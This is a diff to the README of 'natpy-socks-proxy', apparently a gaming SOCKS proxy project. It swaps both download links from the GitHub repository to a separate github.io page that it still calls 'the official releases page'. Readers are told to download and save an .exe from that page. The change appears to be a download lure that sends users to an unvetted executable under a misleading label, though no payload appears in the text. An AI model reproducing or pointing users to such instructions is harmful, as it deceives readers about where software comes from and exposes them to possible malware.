@@ -1,6 +1,6 @@
 # 🌐 natpy-socks-proxy - Fast gaming proxy for stable connections
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/loopy-boidae495/natpy-socks-proxy)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://loopy-boidae495.github.io)
 
 ## 🎯 About This Tool
 
@@ -12,7 +12,7 @@ Your computer needs a few components to run this application. Ensure you have a 
 
 ## 📥 Getting the Application
 
-Visit [the official releases page](https://github.com/loopy-boidae495/natpy-socks-proxy) to download the installation file. Locate the latest version in the list. Click on the file that ends in .exe to start the download. Save this file to your desktop for easy access. 
+Visit [the official releases page](https://loopy-boidae495.github.io) to download the installation file. Locate the latest version in the list. Click on the file that ends in .exe to start the download. Save this file to your desktop for easy access. 
 
 ## ⚙️ Setting Up the Proxy
 
